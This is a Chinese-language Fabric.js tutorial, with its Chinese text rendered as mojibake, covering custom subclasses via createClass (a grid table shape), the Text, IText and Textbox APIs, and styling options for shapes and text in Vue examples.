<p>åœ¨Fabric.jsä¸­ï¼Œå‡ ä¹æ‰€æœ‰çš„2då›¾å½¢ç›´æ¥æˆ–é—´æ¥ç»§æ‰¿è‡ª Object ç±»ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä¸ç”¨å…¶è‡ªå¸¦çš„2då›¾å½¢ï¼Œè€Œæ˜¯è‡ªå»ºå›¾å½¢ï¼Œè¦æ€ä¹ˆåº”ç”¨ Fabric.js ä¸­çš„æ–¹æ³•å‘¢ï¼Ÿ</p>
<p>Fabric.js æä¾›äº† <strong>fabric.util.createClass</strong> æ–¹æ³•è§£å†³è¿™ä¸ªé—®é¢˜</p>
<p>ä¸€ä¸ªè‡ªå®šä¹‰å­ç±»çš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰å­ç±»</span>
      <span class="hljs-keyword">const</span> customClass = fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">createClass</span>(fabric.<span class="hljs-property">Object</span>, {
        <span class="hljs-attr">type</span>: <span class="hljs-string">"customClass"</span>,
        <span class="hljs-attr">initialize</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">options</span>) {
          options || (options = {});
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"initialize"</span>, options);
          <span class="hljs-comment">// è‡ªå®šä¹‰å±æ€§</span>
        },

        <span class="hljs-attr">toObject</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-keyword">return</span> fabric.<span class="hljs-property">util</span>.<span class="hljs-property">object</span>.<span class="hljs-title function_">extend</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"toObject"</span>), {
            <span class="hljs-comment">// å°†è‡ªå®šä¹‰å±æ€§æ·»åŠ åˆ°åºåˆ—åŒ–å¯¹è±¡ä¸­</span>
          });
        },

        <span class="hljs-attr">_render</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">ctx</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"_render"</span>, ctx);
          <span class="hljs-comment">// è‡ªå®šä¹‰æ¸²æŸ“é€»è¾‘</span>
        },
      });
</code></pre>
<p>ä¸€ä¸ªç®€å•çš„è‡ªå®šä¹‰ç±»ä¸»è¦è¦ä¿®æ”¹3ä¸ªåœ°æ–¹ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ol>
<li><strong>initialize</strong> : æ·»åŠ çš„è‡ªå®šä¹‰å±æ€§æ–¹æ³•æ”¾è¿™</li>
<li><strong>toObject</strong>: å°†è‡ªå®šä¹‰å±æ€§æ·»åŠ åˆ°åºåˆ—åŒ–å¯¹è±¡ä¸­ï¼Œæ–¹ä¾¿canvasè®°å½•</li>
<li><strong>_render</strong>: å¤„ç†è‡ªå®šä¹‰æ¸²æŸ“é€»è¾‘</li>
</ol>
<p>æ­¤å¤„ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå†™ä¸€ä¸ªè‡ªå®šä¹‰è¡¨æ ¼å›¾å½¢ï¼š</p>
<p>æ–°å¢ç»˜åˆ¶ç½‘æ ¼å›¾çš„æ–¹æ³• initMapï¼š</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// ç»˜åˆ¶è¡¨æ ¼å›¾å½¢</span>
      <span class="hljs-keyword">function</span> <span class="hljs-title function_">initTable</span>(<span class="hljs-params">options, ctx</span>) {
        <span class="hljs-keyword">const</span> { gridNumX, gridNumY, width, height, fill, left, top } = options;
        ctx.<span class="hljs-title function_">save</span>();
        ctx.<span class="hljs-title function_">translate</span>(-width / <span class="hljs-number">2</span>, -height / <span class="hljs-number">2</span>)
        <span class="hljs-comment">// å¼€å§‹è·¯å¾„å¹¶ç»˜åˆ¶çº¿æ¡</span>
        ctx.<span class="hljs-title function_">beginPath</span>();
        <span class="hljs-comment">// è®¾ç½®çº¿æ¡æ ·å¼</span>
        ctx.<span class="hljs-property">lineWidth</span> = <span class="hljs-number">1</span>;
        ctx.<span class="hljs-property">strokeStyle</span> = fill;
        <span class="hljs-comment">// å¼€å§‹ç»˜åˆ¶æ¨ªçº¿</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; gridNumY + <span class="hljs-number">1</span>; i++) {
          <span class="hljs-comment">// æ³¨æ„è¦ç®—çº¿çš„å®½åº¦ï¼Œä¹Ÿå°±æ˜¯åé¢é‚£ä¸ª+i</span>
          ctx.<span class="hljs-title function_">moveTo</span>(<span class="hljs-number">0</span>, height / gridNumY * i);
          ctx.<span class="hljs-title function_">lineTo</span>(width, height / gridNumY * i);
          ctx.<span class="hljs-title function_">stroke</span>();
        }
        <span class="hljs-comment">// å¼€å§‹ç»˜åˆ¶ç«–çº¿</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; gridNumX + <span class="hljs-number">1</span>; i++) {
          ctx.<span class="hljs-title function_">moveTo</span>(width / gridNumX * i, <span class="hljs-number">0</span>);
          ctx.<span class="hljs-title function_">lineTo</span>(width / gridNumX * i, height);
          ctx.<span class="hljs-title function_">stroke</span>();
        }
        ctx.<span class="hljs-title function_">restore</span>();
      }
</code></pre>
<p>åˆ›å»º Table å­ç±»ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰å­ç±»</span>
      <span class="hljs-keyword">const</span> <span class="hljs-title class_">Map</span> = fabric.<span class="hljs-property">util</span>.<span class="hljs-title function_">createClass</span>(fabric.<span class="hljs-property">Object</span>, {
        <span class="hljs-attr">type</span>: <span class="hljs-string">"Table"</span>,
        <span class="hljs-attr">initialize</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">options</span>) {
          options || (options = {});
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"initialize"</span>, options);
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">"gridNumX"</span>, options.<span class="hljs-property">gridNumX</span> || <span class="hljs-string">""</span>);
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">"gridNumY"</span>, options.<span class="hljs-property">gridNumY</span> || <span class="hljs-string">""</span>);
        },

        <span class="hljs-attr">toObject</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-keyword">return</span> fabric.<span class="hljs-property">util</span>.<span class="hljs-property">object</span>.<span class="hljs-title function_">extend</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"toObject"</span>), {
            <span class="hljs-attr">gridNumX</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">"gridNumX"</span>),
            <span class="hljs-attr">gridNumY</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">"gridNumY"</span>),
          });
        },

        <span class="hljs-attr">_render</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">ctx</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callSuper</span>(<span class="hljs-string">"_render"</span>, ctx);
          <span class="hljs-title function_">initTable</span>({
            ...<span class="hljs-variable language_">this</span>
          }, ctx)
        },
      });
</code></pre>
<p>æ–°å»º Table å®ä¾‹å¹¶æ·»åŠ åˆ°canvasï¼š</p>
<pre><code class="hljs language-ts" lang="ts">      <span class="hljs-keyword">const</span> table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>({
        <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">"test"</span>,
        <span class="hljs-attr">fill</span>: <span class="hljs-string">"#faa"</span>,
        <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">gridNumX</span>: <span class="hljs-number">4</span>,
        <span class="hljs-attr">gridNumY</span>: <span class="hljs-number">3</span>
      });

      <span class="hljs-keyword">const</span> table2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>({
        <span class="hljs-attr">left</span>: <span class="hljs-number">300</span>,
        <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">label</span>: <span class="hljs-string">"test"</span>,
        <span class="hljs-attr">fill</span>: <span class="hljs-string">"green"</span>,
        <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
        <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>,
        <span class="hljs-attr">gridNumX</span>: <span class="hljs-number">2</span>,
        <span class="hljs-attr">gridNumY</span>: <span class="hljs-number">5</span>
      });
      <span class="hljs-comment">// å°†æ‰€æœ‰å›¾å½¢æ·»åŠ åˆ° canvas ä¸­</span>
      canvas.<span class="hljs-title function_">add</span>(table, table2);
</code></pre>
<p>å¦‚å›¾æ‰€ç¤ºï¼ŒæˆåŠŸåˆ›å»ºäº†å¯å¤ç”¨çš„è‡ªå®šä¹‰å›¾å½¢ï¼Œè€Œä¸”èƒ½å¤Ÿä½¿ç”¨ Object ç±»çš„åŠŸèƒ½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51278909343d4dab95c3bc969afdf05d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=y4NOB3PuiPkXIDGm18c2YwEDaoY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-21">æ–‡æœ¬</h2>
<p><code>Fabric.js</code> æœ‰3ç±»è·Ÿæ–‡æœ¬ç›¸å…³çš„ <code>api</code>ã€‚</p>
<ul>
<li>æ™®é€šæ–‡æœ¬</li>
<li>å¯ç¼–è¾‘æ–‡æœ¬</li>
<li>æ–‡æœ¬æ¡†</li>
</ul>
<h3 data-id="heading-22">æ™®é€šæ–‡æœ¬ Text</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'hello'</span>)
  canvas.<span class="hljs-title function_">add</span>(text)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Text</code> åˆ›å»ºæ–‡æœ¬ï¼Œä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æ–‡æœ¬å†…å®¹ã€‚</p>
<p><code>new fabric.Text</code> è¿˜æ”¯æŒç¬¬äºŒä¸ªå‚æ•°ï¼Œå¯ä»¥è®¾ç½®æ–‡æœ¬æ ·å¼ã€‚</p>
<h3 data-id="heading-23">å¯ç¼–è¾‘æ–‡æœ¬ IText</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> itext = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">IText</span>(<span class="hljs-string">'hello'</span>)
  canvas.<span class="hljs-title function_">add</span>(itext)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.IText</code> å¯ä»¥åˆ›å»º<strong>å¯ç¼–è¾‘æ–‡æœ¬</strong>ï¼Œç”¨æ³•å’Œ <code>new fabric.Text</code> ä¸€æ ·ã€‚</p>
<h3 data-id="heading-24">æ–‡æœ¬æ¡† Textbox</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> textbox = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Textbox</span>(<span class="hljs-string">'What are you doing?'</span>, {
    <span class="hljs-attr">width</span>: <span class="hljs-number">250</span>
  })
  canvas.<span class="hljs-title function_">add</span>(textbox)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>new fabric.Textbox</code> å¯ä»¥åˆ›å»ºæ–‡æœ¬æ¡†ã€‚</p>
<p><code>new fabric.Textbox</code> ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯¹è±¡ï¼Œä½¿ç”¨ <code>width</code> å¯ä»¥è®¾å®šäº†æ–‡æœ¬æ¡†çš„å®½åº¦ï¼Œæ–‡æœ¬å†…å®¹è¶…è¿‡è®¾å®šçš„å®½åº¦ä¼šè‡ªåŠ¨æ¢è¡Œã€‚</p>
<p><code>new fabric.Textbox</code> çš„å†…å®¹åŒæ ·æ˜¯<strong>å¯ç¼–è¾‘</strong>çš„ã€‚</p>
<h2 data-id="heading-25">åŸºç¡€æ ·å¼</h2>
<h3 data-id="heading-26">å›¾å½¢å¸¸ç”¨æ ·å¼</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// åŠå¾„ï¼š50px</span>
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'green'</span>, <span class="hljs-comment">// èƒŒæ™¯è‰²ï¼šç»¿è‰²</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// å¡«å……è‰²ï¼šæ©™è‰²</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#f6416c'</span>, <span class="hljs-comment">// è¾¹æ¡†é¢œè‰²ï¼šç²‰è‰²</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">// è¾¹æ¡†ç²—ç»†ï¼š5px</span>
    <span class="hljs-attr">strokeDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>], <span class="hljs-comment">// è¾¹æ¡†è™šçº¿è§„åˆ™ï¼šå¡«å……20px ç©º5px å¡«å……14px ç©º20px å¡«å……5px â€¦â€¦</span>
    <span class="hljs-attr">shadow</span>: <span class="hljs-string">'10px 20px 6px rgba(10, 20, 30, 0.4)'</span>, <span class="hljs-comment">// æŠ•å½±ï¼šå‘å³åç§»10pxï¼Œå‘ä¸‹åç§»20pxï¼Œç¾½åŒ–6pxï¼ŒæŠ•å½±é¢œè‰²åŠé€æ˜åº¦</span>
    <span class="hljs-attr">transparentCorners</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’æ˜¯è¢«å¡«å……äº†ã€‚true ç©ºå¿ƒï¼›false å®å¿ƒ</span>
    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#16f1fc'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè¾¹æ¡†é¢œè‰²ï¼šå¤©è“</span>
    <span class="hljs-attr">borderScaleFactor</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè¾¹çš„ç²—ç»†ï¼š5px</span>
    <span class="hljs-attr">borderDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>], <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè™šçº¿è¾¹çš„è§„åˆ™</span>
    <span class="hljs-attr">cornerColor</span>: <span class="hljs-string">"#a1de93"</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’çš„é¢œè‰²æ˜¯ é’è‰²</span>
    <span class="hljs-attr">cornerStrokeColor</span>: <span class="hljs-string">'pink'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’çš„è¾¹æ¡†çš„é¢œè‰²æ˜¯ ç²‰è‰²</span>
    <span class="hljs-attr">cornerStyle</span>: <span class="hljs-string">'circle'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œå«çš„å±æ€§ã€‚é»˜è®¤rect çŸ©å½¢ï¼›circle åœ†å½¢</span>
    <span class="hljs-attr">cornerSize</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’çš„å¤§å°ä¸º20</span>
    <span class="hljs-attr">cornerDashArray</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>], <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè™šçº¿è§’çš„è§„åˆ™</span>
    <span class="hljs-attr">selectionBackgroundColor</span>: <span class="hljs-string">'#7f1300'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œé€‰æ¡†çš„èƒŒæ™¯è‰²ï¼šæœ±çº¢</span>
    <span class="hljs-attr">padding</span>: <span class="hljs-number">40</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œé€‰æ‹©æ¡†ç¦»å…ƒç´ çš„å†…è¾¹è·ï¼š40px</span>
    <span class="hljs-attr">borderOpacityWhenMoving</span>: <span class="hljs-number">0.6</span>, <span class="hljs-comment">// å½“å¯¹è±¡æ´»åŠ¨å’Œç§»åŠ¨æ—¶ï¼Œå¯¹è±¡æ§åˆ¶è¾¹ç•Œçš„ä¸é€æ˜åº¦  </span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-27">æ–‡æœ¬å¸¸ç”¨æ ·å¼</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'hello'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">120</span>,
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'green'</span>, <span class="hljs-comment">// èƒŒæ™¯è‰²ï¼šç»¿è‰²</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// å¡«å……è‰²ï¼šæ©™è‰²</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#f6416c'</span>, <span class="hljs-comment">// è¾¹æ¡†é¢œè‰²ï¼šç²‰è‰²</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">3</span>, <span class="hljs-comment">// è¾¹æ¡†ç²—ç»†ï¼š3px</span>
    <span class="hljs-attr">strokeDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>], <span class="hljs-comment">// è¾¹æ¡†è™šçº¿è§„åˆ™ï¼šå¡«å……20px ç©º5px å¡«å……14px ç©º20px å¡«å……5px â€¦â€¦</span>
    <span class="hljs-attr">shadow</span>: <span class="hljs-string">'10px 20px 6px rgba(10, 20, 30, 0.4)'</span>, <span class="hljs-comment">// æŠ•å½±ï¼šå‘å³åç§»10pxï¼Œå‘ä¸‹åç§»20pxï¼Œç¾½åŒ–6pxï¼ŒæŠ•å½±é¢œè‰²åŠé€æ˜åº¦</span>
    <span class="hljs-attr">transparentCorners</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’æ˜¯è¢«å¡«å……äº†ã€‚true ç©ºå¿ƒï¼›false å®å¿ƒ</span>
    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#16f1fc'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè¾¹æ¡†é¢œè‰²ï¼šå¤©è“</span>
    <span class="hljs-attr">borderScaleFactor</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè¾¹çš„ç²—ç»†ï¼š5px</span>
    <span class="hljs-attr">borderDashArray</span>: [<span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>], <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè™šçº¿è¾¹çš„è§„åˆ™</span>
    <span class="hljs-attr">cornerColor</span>: <span class="hljs-string">"#a1de93"</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’çš„é¢œè‰²æ˜¯ é’è‰²</span>
    <span class="hljs-attr">cornerStrokeColor</span>: <span class="hljs-string">'pink'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’çš„è¾¹æ¡†çš„é¢œè‰²æ˜¯ ç²‰è‰²</span>
    <span class="hljs-attr">cornerStyle</span>: <span class="hljs-string">'circle'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œå«çš„å±æ€§ã€‚é»˜è®¤rect çŸ©å½¢ï¼›circle åœ†å½¢</span>
    <span class="hljs-attr">cornerSize</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè§’çš„å¤§å°ä¸º20</span>
    <span class="hljs-attr">cornerDashArray</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>], <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œè™šçº¿è§’çš„è§„åˆ™</span>
    <span class="hljs-attr">selectionBackgroundColor</span>: <span class="hljs-string">'#7f1300'</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œé€‰æ¡†çš„èƒŒæ™¯è‰²ï¼šæœ±çº¢</span>
    <span class="hljs-attr">padding</span>: <span class="hljs-number">40</span>, <span class="hljs-comment">// é€‰ä¸­æ—¶ï¼Œé€‰æ‹©æ¡†ç¦»å…ƒç´ çš„å†…è¾¹è·ï¼š40px</span>
    <span class="hljs-attr">borderOpacityWhenMoving</span>: <span class="hljs-number">0.6</span>, <span class="hljs-comment">// å½“å¯¹è±¡æ´»åŠ¨å’Œç§»åŠ¨æ—¶ï¼Œå¯¹è±¡æ§åˆ¶è¾¹ç•Œçš„ä¸é€æ˜åº¦  </span>
  })

  canvas.<span class="hljs-title function_">add</span>(text)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é…ç½® <strong>ä¸Šåˆ’çº¿</strong> ã€<strong>ä¸‹åˆ’çº¿</strong> ã€<strong>åˆ é™¤çº¿</strong> ã€<strong>å·¦å¯¹é½</strong> ã€ <strong>å³å¯¹é½</strong> ã€ <strong>å±…ä¸­å¯¹é½</strong> ã€ <strong>è¡Œè·</strong> ç­‰ã€‚</p>
